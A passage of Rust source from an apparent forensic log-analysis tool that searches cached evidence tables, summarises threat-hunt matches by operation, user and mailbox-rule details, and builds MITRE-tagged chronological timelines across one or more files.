        for pat in patterns {
            let escaped = pat.replace('"', "\"\"");
            let queries = [format!("\"{escaped}\""), format!("{escaped}*")];
            for q in &queries {
                if let Ok(mut stmt) = conn.prepare("SELECT rowid FROM rows_fts WHERE rows_fts MATCH ?1 ORDER BY rowid ASC LIMIT 200") {
                    if let Ok(rows) = stmt.query_map([q], |r| r.get::<_, i64>(0)) {
                        for r in rows.flatten() {
                            row_set.insert(r);
                        }
                    }
                }
            }
        }
    }

    // 2. Identify prioritized columns first: operation, auditdata, recordtype, command_line, message, etc.
    let text_cols: Vec<&ColumnMeta> = columns
        .iter()
        .filter(|c| c.inferred_type == "text" || c.inferred_type == "blob")
        .collect();

    let mut prioritized_cols = Vec::new();
    let mut other_cols = Vec::new();

    for col in text_cols {
        let l = col.original_name.to_lowercase();
        if l.contains("operation")
            || l.contains("audit")
            || l.contains("record")
            || l.contains("activity")
            || l.contains("command")
            || l.contains("process")
            || l.contains("message")
            || l.contains("detail")
            || l.contains("param")
            || l.contains("subject")
            || l.contains("destination")
        {
            prioritized_cols.push(col);
        } else {
            other_cols.push(col);
        }
    }

    // Scan prioritized columns
    for col in &prioritized_cols {
        let ident = db::quote_ident(&col.sql_name);
        for pat in patterns {
            let like_pat = format!("%{pat}%");
            let sql = format!("SELECT row_num FROM rows WHERE {ident} LIKE ?1 LIMIT 200");
            if let Ok(mut stmt) = conn.prepare(&sql) {
                if let Ok(rows) = stmt.query_map([&like_pat], |r| r.get::<_, i64>(0)) {
                    for r in rows.flatten() {
                        row_set.insert(r);
                    }
                }
            }
        }
    }

    // If still under 100 rows, check remaining text columns
    if row_set.len() < 100 {
        for col in other_cols.iter().take(20) {
            let ident = db::quote_ident(&col.sql_name);
            for pat in patterns {
                let like_pat = format!("%{pat}%");
                let sql = format!("SELECT row_num FROM rows WHERE {ident} LIKE ?1 LIMIT 100");
                if let Ok(mut stmt) = conn.prepare(&sql) {
                    if let Ok(rows) = stmt.query_map([&like_pat], |r| r.get::<_, i64>(0)) {
                        for r in rows.flatten() {
                            row_set.insert(r);
                        }
                    }
                }
            }
        }
    }

    // 3. Also check _intel_match table
    if table_exists(conn, "_intel_match")? {
        let sql = "SELECT row_num FROM _intel_match WHERE technique_id = ?1 OR technique_name LIKE ?2 LIMIT 200";
        for pat in patterns {
            if let Ok(mut stmt) = conn.prepare(sql) {
                let like_pat = format!("%{pat}%");
                if let Ok(rows) = stmt.query_map([pat.as_str(), &like_pat], |r| r.get::<_, i64>(0)) {
                    for r in rows.flatten() {
                        row_set.insert(r);
                    }
                }
            }
        }
    }

    Ok(row_set.into_iter().collect())
}

fn build_hunt_section(
    conn: &Connection,
    columns: &[ColumnMeta],
    topic_name: &str,
    patterns: &[String],
    row_ids: &[i64],
) -> Result<AnalystSection> {
    let mut lines = Vec::new();

    if row_ids.is_empty() {
        let total_rows: i64 = conn
            .query_row("SELECT COUNT(*) FROM rows", [], |r| r.get(0))
            .unwrap_or(0);
        lines.push(AnalystLine {
            text: format!(
                "No events matching '{topic_name}' were identified in this dataset ({total_rows} total rows scanned across all evidence columns)."
            ),
            rows: Vec::new(),
        });
        let sample_pats = patterns.iter().take(6).cloned().collect::<Vec<_>>().join(", ");
        lines.push(AnalystLine {
            text: format!("Patterns evaluated: {sample_pats}."),
            rows: Vec::new(),
        });

        // Show top operations in the file to give the examiner immediate orientation
        let op_col = columns.iter().find(|c| {
            let l = c.original_name.to_lowercase();
            (l.contains("operation") || l.contains("activity") || l.contains("event_name"))
                && !l.contains("hosted")
        });
        if let Some(col) = op_col {
            let ident = db::quote_ident(&col.sql_name);
            let sql = format!(
                "SELECT {ident}, COUNT(*) FROM rows WHERE {ident} IS NOT NULL AND TRIM({ident}) != '' GROUP BY {ident} ORDER BY COUNT(*) DESC LIMIT 5"
            );
            if let Ok(mut stmt) = conn.prepare(&sql) {
                if let Ok(top_ops) = stmt.query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, i64>(1)?))) {
                    let descs: Vec<String> = top_ops.flatten().map(|(op, count)| format!("'{op}' ({count})")).collect();
                    if !descs.is_empty() {
                        lines.push(AnalystLine {
                            text: format!("Top operations recorded in this file: {}.", descs.join(", ")),
                            rows: Vec::new(),
                        });
                    }
                }
            }
        }
        return Ok(AnalystSection {
            heading: format!("Hunt Findings: {topic_name}"),
            lines,
        });
    }

    lines.push(AnalystLine {
        text: format!(
            "Identified {} event(s) matching '{topic_name}' across {} evidence row(s).",
            row_ids.len(),
            row_ids.len()
        ),
        rows: row_ids.to_vec(),
    });

    conn.execute(
        "CREATE TEMP TABLE IF NOT EXISTS _hunt_temp (row_num INTEGER PRIMARY KEY)",
        [],
    )?;
    conn.execute("DELETE FROM _hunt_temp", [])?;
    {
        let mut ins = conn.prepare("INSERT OR IGNORE INTO _hunt_temp (row_num) VALUES (?1)")?;
        for r in row_ids {
            ins.execute([r])?;
        }
    }

    // 1. Group by operation if available
    let op_col = columns.iter().find(|c| {
        let l = c.original_name.to_lowercase();
        (l.contains("operation") || l.contains("activity") || l.contains("event_name") || l.contains("action"))
            && !l.contains("hosted")
    });
    if let Some(col) = op_col {
        let ident = db::quote_ident(&col.sql_name);
        let sql = format!(
            "SELECT r.{ident}, COUNT(*), GROUP_CONCAT(r.row_num)
             FROM _hunt_temp t
             JOIN rows r ON r.row_num = t.row_num
             WHERE r.{ident} IS NOT NULL AND TRIM(r.{ident}) != ''
             GROUP BY r.{ident}
             ORDER BY COUNT(*) DESC LIMIT 8"
        );
        if let Ok(mut stmt) = conn.prepare(&sql) {
            if let Ok(ops) = stmt.query_map([], |r| {
                let op: String = r.get(0)?;
                let count: i64 = r.get(1)?;
                let rows_str: String = r.get(2)?;
                let row_nums: Vec<i64> = rows_str
                    .split(',')
                    .filter_map(|s| s.parse::<i64>().ok())
                    .take(20)
                    .collect();
                Ok((op, count, row_nums))
            }) {
                for item in ops.flatten() {
                    lines.push(AnalystLine {
                        text: format!("Operation '{}': {} event(s).", item.0, item.1),
                        rows: item.2,
                    });
                }
            }
        }
    }

    // 2. Group by user/actor if available
    let user_col = columns.iter().find(|c| {
        let l = c.original_name.to_lowercase();
        (l.contains("user") || l.contains("account") || l.contains("upn") || l.contains("actor"))
            && !l.contains("hosted")
    });
    if let Some(col) = user_col {
        let ident = db::quote_ident(&col.sql_name);
        let sql = format!(
            "SELECT r.{ident}, COUNT(*), GROUP_CONCAT(r.row_num)
             FROM _hunt_temp t
             JOIN rows r ON r.row_num = t.row_num
             WHERE r.{ident} IS NOT NULL AND TRIM(r.{ident}) != ''
             GROUP BY r.{ident}
             ORDER BY COUNT(*) DESC LIMIT 5"
        );
        if let Ok(mut stmt) = conn.prepare(&sql) {
            if let Ok(users) = stmt.query_map([], |r| {
                let user: String = r.get(0)?;
                let count: i64 = r.get(1)?;
                let rows_str: String = r.get(2)?;
                let row_nums: Vec<i64> = rows_str
                    .split(',')
                    .filter_map(|s| s.parse::<i64>().ok())
                    .take(20)
                    .collect();
                Ok((user, count, row_nums))
            }) {
                for item in users.flatten() {
                    lines.push(AnalystLine {
                        text: format!("Associated user/actor '{}': {} event(s).", item.0, item.1),
                        rows: item.2,
                    });
                }
            }
        }
    }

    // 3. Extract rule forwarding / parameter details if present in AuditData or Parameters
    let detail_col = columns.iter().find(|c| {
        let l = c.original_name.to_lowercase();
        l.contains("audit") || l.contains("param") || l.contains("detail") || l.contains("message")
    });
    if let Some(col) = detail_col {
        let ident = db::quote_ident(&col.sql_name);
        let sql = format!(
            "SELECT r.row_num, r.{ident}
             FROM _hunt_temp t
             JOIN rows r ON r.row_num = t.row_num
             WHERE r.{ident} IS NOT NULL AND TRIM(r.{ident}) != ''
             LIMIT 15"
        );
        if let Ok(mut stmt) = conn.prepare(&sql) {
            if let Ok(details) = stmt.query_map([], |r| Ok((r.get::<_, i64>(0)?, r.get::<_, String>(1)?))) {
                for (row_num, text) in details.flatten() {
                    let mut extracted = Vec::new();
                    for key in &["ForwardTo", "RedirectTo", "ForwardAsAttachmentTo", "DeliverToMailboxAndForward", "Name", "RuleName", "TargetUser"] {
                        if let Some(pos) = text.to_lowercase().find(&key.to_lowercase()) {
                            let slice = &text[pos..];
                            let snippet: String = slice.chars().take(80).collect();
                            extracted.push(snippet);
                        }
                    }
                    if !extracted.is_empty() {
                        let desc = extracted.join("; ");
                        lines.push(AnalystLine {
                            text: format!("Rule / action detail: {desc}"),
                            rows: vec![row_num],
                        });
                        break;
                    }
                }
            }
        }
    }

    // 4. Check MITRE matches for these rows
    if table_exists(conn, "_intel_match")? {
        let sql = "SELECT m.technique_id, m.technique_name, COUNT(DISTINCT m.row_num), GROUP_CONCAT(DISTINCT m.row_num)
                   FROM _intel_match m
                   JOIN _hunt_temp t ON t.row_num = m.row_num
                   GROUP BY m.technique_id, m.technique_name
                   ORDER BY COUNT(*) DESC LIMIT 4";
        if let Ok(mut stmt) = conn.prepare(sql) {
            if let Ok(techs) = stmt.query_map([], |r| {
                let tid: String = r.get(0)?;
                let tname: String = r.get(1)?;
                let count: i64 = r.get(2)?;
                let rows_str: String = r.get(3)?;
                let row_nums: Vec<i64> = rows_str
                    .split(',')
                    .filter_map(|s| s.parse::<i64>().ok())
                    .take(20)
                    .collect();
                Ok((tid, tname, count, row_nums))
            }) {
                for (tid, tname, count, row_nums) in techs.flatten() {
                    lines.push(AnalystLine {
                        text: format!("MITRE ATT&CK: {tname} ({tid}) — {count} matching row(s)."),
                        rows: row_nums,
                    });
                }
            }
        }
    }

    Ok(AnalystSection {
        heading: format!("Hunt Findings: {topic_name}"),
        lines,
    })
}

fn find_matching_timeline_rows(
    conn: &Connection,
    keywords: &[String],
    columns: &[ColumnMeta],
) -> Result<Vec<i64>> {
    if keywords.is_empty() {
        if table_exists(conn, "_intel_match")? {
            let mut stmt = conn.prepare(
                "SELECT DISTINCT row_num FROM _intel_match ORDER BY row_num ASC LIMIT 200",
            )?;
            let rows: Vec<i64> = stmt
                .query_map([], |r| r.get(0))?
                .collect::<rusqlite::Result<Vec<_>>>()?;
            if !rows.is_empty() {
                return Ok(rows);
            }
        }
        let mut stmt = conn.prepare("SELECT row_num FROM rows ORDER BY row_num ASC LIMIT 100")?;
        let rows: Vec<i64> = stmt
            .query_map([], |r| r.get(0))?
            .collect::<rusqlite::Result<Vec<_>>>()?;
        return Ok(rows);
    }

    let mut row_set = std::collections::BTreeSet::new();

    if table_exists(conn, "rows_fts")? {
        for kw in keywords {
            let escaped = kw.replace('"', "\"\"");
            let phrase = format!("\"{escaped}\"");
            if let Ok(mut stmt) =
                conn.prepare("SELECT rowid FROM rows_fts WHERE rows_fts MATCH ?1 ORDER BY rowid ASC")
            {
                if let Ok(rows) = stmt.query_map([&phrase], |r| r.get::<_, i64>(0)) {
                    for r in rows.flatten() {
                        row_set.insert(r);
                    }
                }
            }
        }
    }

    if row_set.is_empty() {
        for col in columns {
            if col.inferred_type == "text" || col.inferred_type == "blob" {
                let ident = db::quote_ident(&col.sql_name);
                for kw in keywords {
                    let pattern = format!("%{kw}%");
                    let sql =
                        format!("SELECT row_num FROM rows WHERE {ident} LIKE ?1 LIMIT 200");
                    if let Ok(mut stmt) = conn.prepare(&sql) {
                        if let Ok(rows) = stmt.query_map([&pattern], |r| r.get::<_, i64>(0)) {
                            for r in rows.flatten() {
                                row_set.insert(r);
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(row_set.into_iter().collect())
}

fn timeline_section(
    conn: &Connection,
    columns: &[ColumnMeta],
    keywords: &[String],
    row_ids: &[i64],
) -> Result<(AnalystSection, Option<(usize, String, String)>)> {
    let kw_desc = if keywords.is_empty() {
        "all notable events".to_string()
    } else {
        format!("'{}'", keywords.join("', '"))
    };

    if row_ids.is_empty() {
        return Ok((
            AnalystSection {
                heading: "Keyword Timeline".to_string(),
                lines: vec![AnalystLine {
                    text: format!("No events found matching {kw_desc}."),
                    rows: Vec::new(),
                }],
            },
            Some((0, kw_desc, String::new())),
        ));
    }

    let has_time = row_time_available(conn)?;
    let roles = load_active_roles(conn)?;
    let role_map: HashMap<String, String> = roles.into_iter().collect();

    let user_col = role_map.get("user").cloned().or_else(|| {
        columns
            .iter()
            .find(|c| {
                let l = c.original_name.to_lowercase();
                (l.contains("user") || l.contains("account") || l.contains("username") || l.contains("upn") || l.contains("actor"))
                    && !l.contains("hosted")
            })
            .map(|c| c.sql_name.clone())
    });

    let host_col = role_map.get("host").cloned().filter(|c| !c.to_lowercase().contains("hosted")).or_else(|| {
        columns
            .iter()
            .find(|c| {
                let l = c.original_name.to_lowercase();
                (l.contains("host")
                    || l.contains("computer")
                    || l.contains("workstation")
                    || l.contains("device")
                    || l.contains("machine"))
                    && !l.contains("hosted")
                    && !l.contains("ghost")
            })
            .map(|c| c.sql_name.clone())
    });

    let action_col = role_map
        .get("commandline")
        .cloned()
        .or_else(|| role_map.get("process_name").cloned())
        .or_else(|| {
            columns
                .iter()
                .find(|c| {
                    let l = c.original_name.to_lowercase();
                    (l.contains("operation")
                        || l.contains("activity")
                        || l.contains("command")
                        || l.contains("process")
                        || l.contains("action")
                        || l.contains("event_name")
                        || l.contains("eventname")
                        || l.contains("workload")
                        || l.contains("event")
                        || l.contains("message")
                        || l.contains("detail"))
                        && Some(&c.sql_name) != user_col.as_ref()
                        && Some(&c.sql_name) != host_col.as_ref()
                        && !l.contains("hosted")
                })
                .map(|c| c.sql_name.clone())
        })
        .or_else(|| {
            columns
                .iter()
                .find(|c| {
                    c.inferred_type == "text"
                        && Some(&c.sql_name) != user_col.as_ref()
                        && Some(&c.sql_name) != host_col.as_ref()
                        && !c.original_name.to_lowercase().contains("hosted")
                })
                .map(|c| c.sql_name.clone())
        });

    conn.execute(
        "CREATE TEMP TABLE IF NOT EXISTS _timeline_temp (row_num INTEGER PRIMARY KEY)",
        [],
    )?;
    conn.execute("DELETE FROM _timeline_temp", [])?;
    {
        let mut insert_stmt =
            conn.prepare("INSERT OR IGNORE INTO _timeline_temp (row_num) VALUES (?1)")?;
        for r in row_ids {
            insert_stmt.execute([r])?;
        }
    }

    let user_sql = user_col
        .as_ref()
        .map(|c| format!(", r.{}", db::quote_ident(c)))
        .unwrap_or_default();
    let host_sql = host_col
        .as_ref()
        .map(|c| format!(", r.{}", db::quote_ident(c)))
        .unwrap_or_default();
    let action_sql = action_col
        .as_ref()
        .map(|c| format!(", r.{}", db::quote_ident(c)))
        .unwrap_or_default();

    let query = if has_time {
        format!(
            "SELECT r.row_num, rt.epoch_ms, rt.utc_text {user_sql} {host_sql} {action_sql}
             FROM _timeline_temp t
             JOIN rows r ON r.row_num = t.row_num
             LEFT JOIN _row_time rt ON rt.row_num = r.row_num
             ORDER BY COALESCE(rt.epoch_ms, 9223372036854775807) ASC, r.row_num ASC"
        )
    } else {
        format!(
            "SELECT r.row_num, NULL, NULL {user_sql} {host_sql} {action_sql}
             FROM _timeline_temp t
             JOIN rows r ON r.row_num = t.row_num
             ORDER BY r.row_num ASC"
        )
    };

    let mut intel_map: HashMap<i64, Vec<String>> = HashMap::new();
    if table_exists(conn, "_intel_match")? {
        let intel_query = "SELECT m.row_num, m.technique_id, m.technique_name
             FROM _intel_match m
             JOIN _timeline_temp t ON t.row_num = m.row_num
             ORDER BY m.score DESC";
        if let Ok(mut stmt) = conn.prepare(intel_query) {
            if let Ok(rows) = stmt.query_map([], |r| {
                Ok((
                    r.get::<_, i64>(0)?,
                    r.get::<_, String>(1)?,
                    r.get::<_, String>(2)?,
                ))
            }) {
                for item in rows.flatten() {
                    let entry = intel_map.entry(item.0).or_default();
                    if entry.len() < 2 {
                        entry.push(format!("{} {}", item.1, item.2));
                    }
                }
            }
        }
    }

    struct TimelineRowData {
        row_num: i64,
        epoch_ms: Option<i64>,
        utc_text: Option<String>,
        user: Option<String>,
        host: Option<String>,
        action: Option<String>,
    }

    let mut stmt = conn.prepare(&query)?;
    let mut col_offset = 3;
    let user_idx = if user_col.is_some() {
        let idx = col_offset;
        col_offset += 1;
        Some(idx)
    } else {
        None
    };
    let host_idx = if host_col.is_some() {
        let idx = col_offset;
        col_offset += 1;
        Some(idx)
    } else {
        None
    };
    let action_idx = if action_col.is_some() {
        let idx = col_offset;
        Some(idx)
    } else {
        None
    };

    let timeline_rows: Vec<TimelineRowData> = stmt
        .query_map([], |r| {
            let user = user_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
            let host = host_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
            let action =
                action_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
            Ok(TimelineRowData {
                row_num: r.get(0)?,
                epoch_ms: r.get(1)?,
                utc_text: r.get(2)?,
                user,
                host,
                action,
            })
        })?
        .collect::<rusqlite::Result<Vec<_>>>()?;

    let mut first_epoch: Option<i64> = None;
    let mut last_epoch: Option<i64> = None;
    let mut prev_epoch: Option<i64> = None;

    for row in &timeline_rows {
        if let Some(ep) = row.epoch_ms {
            if first_epoch.is_none() {
                first_epoch = Some(ep);
            }
            last_epoch = Some(ep);
        }
    }

    let duration_str = match (first_epoch, last_epoch) {
        (Some(start), Some(end)) if end >= start => format_duration_ms(end - start),
        _ => String::new(),
    };

    let span_summary = if !duration_str.is_empty() {
        format!(" (spanning {duration_str})")
    } else {
        String::new()
    };

    let all_matching_ids: Vec<i64> = timeline_rows.iter().map(|r| r.row_num).collect();
    let total_count = all_matching_ids.len();

    let mut lines = Vec::new();
    lines.push(AnalystLine {
        text: format!(
            "Chronological sequence: {total_count} matching events identified for {kw_desc}{span_summary}."
        ),
        rows: all_matching_ids,
    });

    for row in timeline_rows.iter().take(MAX_NARRATED_TIMELINE_EVENTS) {
        let delta_str = match (row.epoch_ms, prev_epoch) {
            (Some(curr), Some(prev)) if curr >= prev => {
                format!("+{}", format_duration_ms(curr - prev))
            }
            (Some(_), None) => "+0s".to_string(),
            _ => String::new(),
        };
        if let Some(ep) = row.epoch_ms {
            prev_epoch = Some(ep);
        }

        let time_part = if let Some(ref utc) = row.utc_text {
            let d_tag = if !delta_str.is_empty() {
                format!(" ({delta_str})")
            } else {
                String::new()
            };
            format!("{utc}{d_tag}")
        } else {
            format!("Row #{}", row.row_num)
        };

        let mut details = Vec::new();
        if let Some(ref u) = row.user {
            if !u.trim().is_empty() {
                details.push(format!("user {u}"));
            }
        }
        if let Some(ref h) = row.host {
            if !h.trim().is_empty() {
                details.push(format!("on host {h}"));
            }
        }
        let actor_host_str = if details.is_empty() {
            String::new()
        } else {
            format!("{}: ", details.join(" "))
        };

        let action_str = row.action.as_deref().unwrap_or("").trim();
        let action_display = if action_str.len() > 120 {
            format!("{}...", &action_str[..117])
        } else if !action_str.is_empty() {
            action_str.to_string()
        } else {
            "event recorded".to_string()
        };

        let mitre_tags = if let Some(tags) = intel_map.get(&row.row_num) {
            format!(" [{}]", tags.join(" | "))
        } else {
            String::new()
        };

        lines.push(AnalystLine {
            text: format!("{time_part} — {actor_host_str}{action_display}{mitre_tags}"),
            rows: vec![row.row_num],
        });
    }

    if total_count > MAX_NARRATED_TIMELINE_EVENTS {
        lines.push(AnalystLine {
            text: format!(
                "… and {} more events in sequence. Use 'View in Table' above to browse all {total_count} events in chronological order.",
                total_count - MAX_NARRATED_TIMELINE_EVENTS
            ),
            rows: Vec::new(),
        });
    }

    Ok((
        AnalystSection {
            heading: "Keyword Timeline".to_string(),
            lines,
        },
        Some((total_count, kw_desc, duration_str)),
    ))
}

pub fn multi_file_timeline(
    targets: &[FileTarget],
    ask_text: &str,
) -> Result<AnalystAnswer> {
    let keywords = extract_timeline_keywords(ask_text);
    let kw_desc = if keywords.is_empty() {
        "all notable events".to_string()
    } else {
        format!("'{}'", keywords.join("', '"))
    };

    struct CombinedTimelineRow {
        row_num: i64,
        file_name: String,
        epoch_ms: Option<i64>,
        utc_text: Option<String>,
        user: Option<String>,
        host: Option<String>,
        action: Option<String>,
        mitre_tags: Vec<String>,
    }

    let mut all_events: Vec<CombinedTimelineRow> = Vec::new();
    let mut scanned_count = 0;

    for target in targets {
        let file_name = std::path::Path::new(&target.path)
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| target.path.clone());
        let sheet_name = target.sheet.clone().unwrap_or_default();

        let db_path = if let Some(ref p) = target.cache_db_path {
            let candidate = std::path::PathBuf::from(p);
            if candidate.exists() {
                candidate
            } else {
                db::cache_db_path(std::path::Path::new(&target.path), &sheet_name)
                    .unwrap_or_else(|_| std::path::PathBuf::from(p))
            }
        } else {
            match db::cache_db_path(std::path::Path::new(&target.path), &sheet_name) {
                Ok(p) => p,
                Err(_) => continue,
            }
        };

        if !db_path.exists() {
            continue;
        }

        let mut conn = match db::open(&db_path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        let columns = match db::load_columns(&conn) {
            Ok(cols) => cols,
            Err(_) => continue,
        };

        // If _row_time table doesn't exist, try quick timestamp normalization
        if !row_time_available(&conn).unwrap_or(false) {
            let _ = time::normalize_timestamp_column_with_options(&mut conn, &columns, None, None);
        }

        let row_ids = match find_matching_timeline_rows(&conn, &keywords, &columns) {
            Ok(ids) => ids,
            Err(_) => continue,
        };

        if row_ids.is_empty() {
            continue;
        }

        scanned_count += 1;

        let has_time = row_time_available(&conn).unwrap_or(false);
        let roles = load_active_roles(&conn).unwrap_or_default();
        let role_map: HashMap<String, String> = roles.into_iter().collect();

        let user_col = role_map.get("user").cloned().or_else(|| {
            columns
                .iter()
                .find(|c| {
                    let l = c.original_name.to_lowercase();
                    (l.contains("user") || l.contains("account") || l.contains("username") || l.contains("upn") || l.contains("actor"))
                        && !l.contains("hosted")
                })
                .map(|c| c.sql_name.clone())
        });

        let host_col = role_map.get("host").cloned().filter(|c| !c.to_lowercase().contains("hosted")).or_else(|| {
            columns
                .iter()
                .find(|c| {
                    let l = c.original_name.to_lowercase();
                    (l.contains("host")
                        || l.contains("computer")
                        || l.contains("workstation")
                        || l.contains("device")
                        || l.contains("machine"))
                        && !l.contains("hosted")
                        && !l.contains("ghost")
                })
                .map(|c| c.sql_name.clone())
        });

        let action_col = role_map
            .get("commandline")
            .cloned()
            .or_else(|| role_map.get("process_name").cloned())
            .or_else(|| {
                columns
                    .iter()
                    .find(|c| {
                        let l = c.original_name.to_lowercase();
                        (l.contains("operation")
                            || l.contains("activity")
                            || l.contains("command")
                            || l.contains("process")
                            || l.contains("action")
                            || l.contains("event_name")
                            || l.contains("eventname")
                            || l.contains("workload")
                            || l.contains("event")
                            || l.contains("message")
                            || l.contains("detail"))
                            && Some(&c.sql_name) != user_col.as_ref()
                            && Some(&c.sql_name) != host_col.as_ref()
                            && !l.contains("hosted")
                    })
                    .map(|c| c.sql_name.clone())
            })
            .or_else(|| {
                columns
                    .iter()
                    .find(|c| {
                        c.inferred_type == "text"
                            && Some(&c.sql_name) != user_col.as_ref()
                            && Some(&c.sql_name) != host_col.as_ref()
                            && !c.original_name.to_lowercase().contains("hosted")
                    })
                    .map(|c| c.sql_name.clone())
            });

        let _ = conn.execute(
            "CREATE TEMP TABLE IF NOT EXISTS _timeline_temp (row_num INTEGER PRIMARY KEY)",
            [],
        );
        let _ = conn.execute("DELETE FROM _timeline_temp", []);
        if let Ok(mut insert_stmt) =
            conn.prepare("INSERT OR IGNORE INTO _timeline_temp (row_num) VALUES (?1)")
        {
            for r in &row_ids {
                let _ = insert_stmt.execute([r]);
            }
        }

        let user_sql = user_col
            .as_ref()
            .map(|c| format!(", r.{}", db::quote_ident(c)))
            .unwrap_or_default();
        let host_sql = host_col
            .as_ref()
            .map(|c| format!(", r.{}", db::quote_ident(c)))
            .unwrap_or_default();
        let action_sql = action_col
            .as_ref()
            .map(|c| format!(", r.{}", db::quote_ident(c)))
            .unwrap_or_default();

        let query = if has_time {
            format!(
                "SELECT r.row_num, rt.epoch_ms, rt.utc_text {user_sql} {host_sql} {action_sql}
                 FROM _timeline_temp t
                 JOIN rows r ON r.row_num = t.row_num
                 LEFT JOIN _row_time rt ON rt.row_num = r.row_num
                 ORDER BY COALESCE(rt.epoch_ms, 9223372036854775807) ASC, r.row_num ASC"
            )
        } else {
            format!(
                "SELECT r.row_num, NULL, NULL {user_sql} {host_sql} {action_sql}
                 FROM _timeline_temp t
                 JOIN rows r ON r.row_num = t.row_num
                 ORDER BY r.row_num ASC"
            )
        };

        let mut intel_map: HashMap<i64, Vec<String>> = HashMap::new();
        if table_exists(&conn, "_intel_match").unwrap_or(false) {
            let intel_query = "SELECT m.row_num, m.technique_id, m.technique_name
                 FROM _intel_match m
                 JOIN _timeline_temp t ON t.row_num = m.row_num
                 ORDER BY m.score DESC";
            let mut stmt = conn.prepare(intel_query);
            if let Ok(ref mut s) = stmt {
                if let Ok(rows) = s.query_map([], |r| {
                    Ok((
                        r.get::<_, i64>(0)?,
                        r.get::<_, String>(1)?,
                        r.get::<_, String>(2)?,
                    ))
                }) {
                    for item in rows.flatten() {
                        let entry = intel_map.entry(item.0).or_default();
                        if entry.len() < 2 {
                            entry.push(format!("{} {}", item.1, item.2));
                        }
                    }
                }
            }
        }

        let mut col_offset = 3;
        let user_idx = if user_col.is_some() {
            let idx = col_offset;
            col_offset += 1;
            Some(idx)
        } else {
            None
        };
        let host_idx = if host_col.is_some() {
            let idx = col_offset;
            col_offset += 1;
            Some(idx)
        } else {
            None
        };
        let action_idx = if action_col.is_some() {
            let idx = col_offset;
            Some(idx)
        } else {
            None
        };

        {
            let mut stmt = conn.prepare(&query);
            if let Ok(ref mut s) = stmt {
                if let Ok(rows) = s.query_map([], |r| {
                    let user = user_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
                    let host = host_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
                    let action = action_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
                    Ok((
                        r.get::<_, i64>(0)?,
                        r.get::<_, Option<i64>>(1)?,
                        r.get::<_, Option<String>>(2)?,
                        user,
                        host,
                        action,
                    ))
                }) {
                    for r in rows.flatten() {
                        let row_num = r.0;
                        let tags = intel_map.get(&row_num).cloned().unwrap_or_default();
                        all_events.push(CombinedTimelineRow {
                            row_num,
                            file_name: file_name.clone(),
                            epoch_ms: r.1,
                            utc_text: r.2,
                            user: r.3,
                            host: r.4,
                            action: r.5,
                            mitre_tags: tags,
                        });
                    }
                }
            }
        }
    }

    if all_events.is_empty() {
        return Ok(AnalystAnswer {
            intent: "timeline".to_string(),
            headline: format!("No timeline events found matching {kw_desc} across loaded files."),
            sections: vec![AnalystSection {
                heading: "Keyword Timeline".to_string(),
                lines: vec![AnalystLine {
                    text: format!("No events found matching {kw_desc} across {scanned_count} files."),
                    rows: Vec::new(),
                }],
            }],
            steps: vec![AnalystStep {
                step: "multi_file_timeline".to_string(),
                status: "ran".to_string(),
                detail: format!("scanned {scanned_count} files, 0 matches"),
            }],
            report_requested: false,
            use_guided_search: false,
            scan: None,
            anomalies: None,
            activity: None,
        });
    }

    // Sort all events chronologically across all files
    all_events.sort_by(|a, b| {
        match (a.epoch_ms, b.epoch_ms) {
            (Some(ea), Some(eb)) => ea.cmp(&eb),
            (Some(_), None) => std::cmp::Ordering::Less,
            (None, Some(_)) => std::cmp::Ordering::Greater,
            (None, None) => a.file_name.cmp(&b.file_name).then(a.row_num.cmp(&b.row_num)),
        }
    });

    let mut first_epoch: Option<i64> = None;
    let mut last_epoch: Option<i64> = None;
    let mut prev_epoch: Option<i64> = None;

    for row in &all_events {
        if let Some(ep) = row.epoch_ms {
            if first_epoch.is_none() {
                first_epoch = Some(ep);
            }
            last_epoch = Some(ep);
        }
    }

    let duration_str = match (first_epoch, last_epoch) {
        (Some(start), Some(end)) if end >= start => format_duration_ms(end - start),
        _ => String::new(),
    };

    let span_summary = if !duration_str.is_empty() {
        format!(" (spanning {duration_str})")
    } else {
        String::new()
    };

    let total_count = all_events.len();
    let file_label = if scanned_count > 1 {
        format!("across {scanned_count} files: ")
    } else {
        String::new()
    };

    let mut file_events: HashMap<String, Vec<i64>> = HashMap::new();
    for row in &all_events {
        file_events.entry(row.file_name.clone()).or_default().push(row.row_num);
    }

    let (file_tag, first_line_rows) = if file_events.len() == 1 {
        let (fname, f_rows) = file_events.iter().next().unwrap();
        (format!(" [{fname}]"), f_rows.clone())
    } else {
        (String::new(), Vec::new())
    };

    let mut lines = Vec::new();
    lines.push(AnalystLine {
        text: format!(
            "Chronological sequence {file_label}{total_count} matching events identified for {kw_desc}{span_summary}.{file_tag}"
        ),
        rows: first_line_rows,
    });

    if file_events.len() > 1 {
        for (fname, f_rows) in &file_events {
            lines.push(AnalystLine {
                text: format!("[{fname}] {} correlated event(s) across timeline.", f_rows.len()),
                rows: f_rows.clone(),
            });
        }
    }

    for row in all_events.iter().take(MAX_NARRATED_TIMELINE_EVENTS) {
        let delta_str = match (row.epoch_ms, prev_epoch) {
            (Some(curr), Some(prev)) if curr >= prev => {
                format!("+{}", format_duration_ms(curr - prev))
            }
            (Some(_), None) => "+0s".to_string(),
            _ => String::new(),
        };
        if let Some(ep) = row.epoch_ms {
            prev_epoch = Some(ep);
        }

        let time_part = if let Some(ref utc) = row.utc_text {
            let d_tag = if !delta_str.is_empty() {
                format!(" ({delta_str})")
            } else {
                String::new()
            };
            format!("{utc}{d_tag}")
        } else {
            format!("Row #{}", row.row_num)
        };

        let mut details = Vec::new();
        if let Some(ref u) = row.user {
            if !u.trim().is_empty() {
                details.push(format!("user {u}"));
            }
        }
        if let Some(ref h) = row.host {
            if !h.trim().is_empty() {
                details.push(format!("on host {h}"));
            }
        }
        let actor_host_str = if details.is_empty() {
            String::new()
        } else {
            format!("{}: ", details.join(" "))
        };

        let action_str = row.action.as_deref().unwrap_or("").trim();
        let action_display = if action_str.len() > 120 {
            format!("{}...", &action_str[..117])
